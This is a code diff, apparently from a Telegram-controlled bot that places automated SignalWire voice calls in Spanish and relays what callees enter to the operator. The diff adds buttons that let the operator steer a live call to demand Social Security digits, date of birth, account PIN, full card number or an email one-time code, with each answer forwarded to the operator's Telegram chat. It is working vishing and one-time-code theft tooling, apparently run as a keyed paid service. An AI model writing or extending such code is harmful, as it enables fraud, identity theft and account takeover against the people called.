@@ -9,8 +9,8 @@ from datetime import datetime, timedelta
 from flask import Flask, request, Response
 from signalwire.rest import Client as SignalWireClient
 from signalwire.voice_response import VoiceResponse, Gather
-from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 
 TELEGRAM_TOKEN   = os.environ["TELEGRAM_TOKEN"]
 SW_PROJECT_ID    = os.environ["SW_PROJECT_ID"]
@@ -177,17 +177,131 @@ def codigo_webhook(call_sid, chat_id):
     codigo    = request.form.get("Digits", "")
     to_number = request.form.get("To", "")
 
-    notify_telegram(int(chat_id), (
-        f"🔢 *Código de cuenta recibido*\n"
-        f"━━━━━━━━━━━━━━━\n"
-        f"📱 `{to_number}`\n"
-        f"🔑 Código: *{codigo}*"
-    ))
+    # Guardar info de la llamada activa
+    call_sessions[call_sid]["codigo"] = codigo
+    call_sessions[call_sid]["to_number"] = to_number
 
+    # Enviar botones inline a Telegram
+    keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "✅ Válido", "callback_data": f"accion|valido|{call_sid}"},
+                {"text": "❌ Inválido", "callback_data": f"accion|invalido|{call_sid}"}
+            ],
+            [
+                {"text": "🔢 Pedir SSN", "callback_data": f"accion|ssn|{call_sid}"},
+                {"text": "🎂 Pedir DOB", "callback_data": f"accion|dob|{call_sid}"}
+            ],
+            [
+                {"text": "🔑 Pedir PIN", "callback_data": f"accion|pin|{call_sid}"},
+                {"text": "💳 Pedir Card #", "callback_data": f"accion|card|{call_sid}"}
+            ],
+            [
+                {"text": "📧 Mail OTP", "callback_data": f"accion|mailotp|{call_sid}"},
+                {"text": "🚫 Colgar", "callback_data": f"accion|colgar|{call_sid}"}
+            ]
+        ]
+    }
+    try:
+        req.post(
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            json={
+                "chat_id": int(chat_id),
+                "text": f"🔢 *Código de cuenta recibido*\n━━━━━━━━━━━━━━━\n📱 `{to_number}`\n🔑 Código: *{codigo}*\n\n¿Qué deseas hacer?",
+                "parse_mode": "Markdown",
+                "reply_markup": keyboard
+            },
+            timeout=10
+        )
+    except Exception as e:
+        log.error(e)
+
+    # Mantener cliente en espera
     response = VoiceResponse()
     response.say("Hemos recibido su codigo. Por favor espere un momento.", language="es-MX", rate="85%")
-    response.pause(length=5)
-    response.say("Gracias por su paciencia.", language="es-MX", rate="85%")
+    response.pause(length=30)
+    response.say("Gracias por su paciencia. Hasta luego.", language="es-MX", rate="85%")
+    response.hangup()
+    return Response(str(response), mimetype="text/xml")
+
+@flask_app.route("/accion_llamada/<call_sid>/<accion>", methods=["GET"])
+def accion_llamada(call_sid, accion):
+    """SignalWire llama aquí para obtener las instrucciones siguientes"""
+    response = VoiceResponse()
+
+    mensajes = {
+        "valido":  "Su codigo ha sido validado correctamente. Gracias.",
+        "invalido": "Lo sentimos, el codigo ingresado es incorrecto. Por favor intente de nuevo.",
+        "ssn":     "Por favor ingrese los ultimos 3 digitos de su numero de seguro social.",
+        "dob":     "Por favor ingrese su fecha de nacimiento en formato mes, dia, ano.",
+        "pin":     "Por favor ingrese su PIN de cuenta.",
+        "card":    "Por favor ingrese su numero de tarjeta.",
+        "mailotp": "Le hemos enviado un codigo de verificacion a su correo electronico. Por favor ingreselo ahora.",
+        "colgar":  "Gracias por llamar. Hasta luego.",
+    }
+
+    if accion == "colgar":
+        response.say(mensajes["colgar"], language="es-MX", rate="85%")
+        response.hangup()
+    elif accion in ["ssn", "dob", "pin", "card", "mailotp"]:
+        session = call_sessions.get(call_sid, {})
+        chat_id = session.get("chat_id", ADMIN_CHAT_ID)
+        digitos = {"ssn": 3, "dob": 8, "pin": 4, "card": 16, "mailotp": 6}
+        num_dig = digitos.get(accion, 6)
+        gather = Gather(
+            num_digits=num_dig,
+            action=f"{WEBHOOK_BASE_URL}/codigo2/{call_sid}/{chat_id}/{accion}",
+            method="POST",
+            timeout=15,
+            finish_on_key=""
+        )
+        gather.say(mensajes[accion], language="es-MX", rate="85%")
+        response.append(gather)
+        response.say("No recibimos su respuesta. Hasta luego.", language="es-MX", rate="85%")
+        response.hangup()
+    else:
+        response.say(mensajes.get(accion, "Gracias."), language="es-MX", rate="85%")
+        response.hangup()
+
+    return Response(str(response), mimetype="text/xml")
+
+@flask_app.route("/codigo2/<call_sid>/<chat_id>/<tipo>", methods=["POST"])
+def codigo2_webhook(call_sid, chat_id, tipo):
+    """Recibe el segundo código del cliente"""
+    codigo    = request.form.get("Digits", "")
+    to_number = request.form.get("To", "")
+
+    nombres = {"ssn": "SSN (últimos 3)", "dob": "Fecha de nacimiento", "pin": "PIN", "card": "Card #", "mailotp": "Mail OTP"}
+
+    keyboard = {
+        "inline_keyboard": [
+            [
+                {"text": "✅ Válido", "callback_data": f"accion|valido|{call_sid}"},
+                {"text": "❌ Inválido", "callback_data": f"accion|invalido|{call_sid}"}
+            ],
+            [
+                {"text": "🚫 Colgar", "callback_data": f"accion|colgar|{call_sid}"}
+            ]
+        ]
+    }
+    try:
+        req.post(
+            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+            json={
+                "chat_id": int(chat_id),
+                "text": f"🔢 *{nombres.get(tipo, tipo)}*\n━━━━━━━━━━━━━━━\n📱 `{to_number}`\n🔑 Código: *{codigo}*\n\n¿Válido o inválido?",
+                "parse_mode": "Markdown",
+                "reply_markup": keyboard
+            },
+            timeout=10
+        )
+    except Exception as e:
+        log.error(e)
+
+    response = VoiceResponse()
+    response.say("Hemos recibido su informacion. Por favor espere.", language="es-MX", rate="85%")
+    response.pause(length=30)
+    response.say("Gracias. Hasta luego.", language="es-MX", rate="85%")
     response.hangup()
     return Response(str(response), mimetype="text/xml")
 
@@ -391,6 +505,35 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text("Usa el menú.", reply_markup=menu_con_key() if is_active(chat_id) else menu_sin_key())
 
+async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+
+    if data.startswith("accion|"):
+        _, accion, call_sid = data.split("|")
+
+        # Redirigir la llamada al endpoint de acción
+        try:
+            sw_client.calls(call_sid).update(
+                url=f"{WEBHOOK_BASE_URL}/accion_llamada/{call_sid}/{accion}",
+                method="GET"
+            )
+            nombres = {
+                "valido": "✅ Código validado",
+                "invalido": "❌ Código inválido",
+                "ssn": "🔢 Pidiendo SSN",
+                "dob": "🎂 Pidiendo DOB",
+                "pin": "🔑 Pidiendo PIN",
+                "card": "💳 Pidiendo Card #",
+                "mailotp": "📧 Enviando Mail OTP",
+                "colgar": "🚫 Colgando"
+            }
+            await query.edit_message_reply_markup(reply_markup=None)
+            await query.message.reply_text(f"▶️ {nombres.get(accion, accion)}")
+        except Exception as e:
+            await query.message.reply_text(f"❌ Error: `{e}`", parse_mode="Markdown")
+
 def run_flask():
     flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)), use_reloader=False)
 
@@ -401,6 +544,7 @@ def main():
     app.add_handler(CommandHandler("start", cmd_start))
     app.add_handler(CommandHandler("genkey", cmd_genkey))
     app.add_handler(CommandHandler("redeem", cmd_redeem))
+    app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     log.info("✅ Bot activo")
     app.run_polling(drop_pending_updates=True)
